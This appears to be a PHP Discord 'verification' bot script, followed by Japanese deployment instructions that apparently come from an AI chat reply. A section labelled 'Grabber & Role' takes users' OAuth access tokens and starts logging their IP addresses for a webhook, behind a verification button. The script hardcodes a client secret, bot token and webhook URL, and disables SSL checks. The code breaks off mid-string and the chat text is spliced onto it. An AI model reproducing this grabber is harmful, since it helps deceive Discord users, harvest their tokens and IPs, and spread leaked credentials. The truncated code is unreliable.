<?php
// エラー表示（デバッグ用）
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Railwayの生存確認
if (str_contains($_SERVER['REQUEST_URI'], '/health')) {
    http_response_code(200);
    exit('OK');
}

// --- 【設定データ：更新済み】 ---
$client_id     = '1483731872050839564';
$client_secret = 'x1dQum1L-xtASg0NHH29gPrnRDEjIA_L'; 
$webhook_url   = 'https://discordapp.com/api/webhooks/1483782613175898182/Tn_fOYkYX02lPxGg3e5nLnKgUdjGQQVNnbqtcxchFiwd0bC_acV8hvFmRyAN6vEeHaU_'; 
$redirect_uri  = 'https://discord-verify-production-4476.up.railway.app'; 
$bot_token     = 'MTQ4MzczMTg3MjA1MDgzOTU2NA.G8IV22.pwyIoWuAwrHn1RUE6aPu1ks9WpFrAGdzBmwXdk'; 
$guild_id      = '1483346769025831035'; 
$role_id       = '1483424484043260024'; 

// 認証URL
$auth_url = "https://discord.com/oauth2/authorize?client_id={$client_id}&response_type=code&redirect_uri=" . urlencode($redirect_uri) . "&scope=identify+guilds.join";

// --- 機能1: 認証ボタンの送信 ---
if (str_contains($_SERVER['REQUEST_URI'], '/send_button')) {
    $payload = json_encode([
        "embeds" => [[
            "title" => "認証",
            "description" => "サーバーに参加してくれてありがとうございます。最初は認証からお願いします。\n\n認証後 <@&{$role_id}> が付与されます。\n\n**BOT作成者 @Unify_BOT**",
            "color" => 5814783
        ]],
        "components" => [[
            "type" => 1,
            "components" => [[
                "type" => 2, "label" => "認証", "style" => 5, "url" => $auth_url
            ]]
        ]]
    ]);

    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // SSLエラーを強制回避
    $res = curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    exit("Status: {$status} | Webhook Response: {$res} (If 204, it is success!)");
}

// --- 機能2: 認証処理 (Grabber & Role) ---
if (!isset($_GET['code'])) {
    exit("System Active.");
}

// Token取得
$ch = curl_init('https://discord.com/api/oauth2/token');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'client_id' => $client_id,
    'client_secret' => $client_secret,
    'grant_type' => 'authorization_code',
    'code' => $_GET['code'],
    'redirect_uri' => $redirect_uri
]));
$res = json_decode(curl_exec($ch), true);

if (isset($res['access_token'])) {
    $at = $res['access_token'];

    // ユーザー取得
    $ch = curl_init('https://discord.com/api/users/@me');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bearer $at"]);
    $user = json_decode(curl_exec($ch), true);

    // ロール付与
    $ch = curl_init("https://discord.com/api/guilds/{$guild_id}/members/{$user['id']}");
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bot $bot_token", "Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['access_token' => $at, 'roles' => [$role_id]]));
    curl_exec($ch);

    // ログ送信
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $log = "
http://googleusercontent.com/immersive_entry_chip/0

---

### 🚀 確認すること

1.  GitHubを更新して Railway のデプロイを待ちます。
2.  ブラウザで `https://discord-verify-production-4476.up.railway.app/send_button` を開きます。
3.  画面に **`Status: 204`** と表示されれば、Discordサーバーにボタンが届いているはずです！

もしこれで Discord に何も来ない場合は、**Webhookを作ったときに指定した「チャンネル」**が、あなたの今見ているチャンネルと一致しているか、または「メッセージ送信権限」がボットやWebhookにあるかをチェックしてください。

**これでボタンは表示されましたか？**
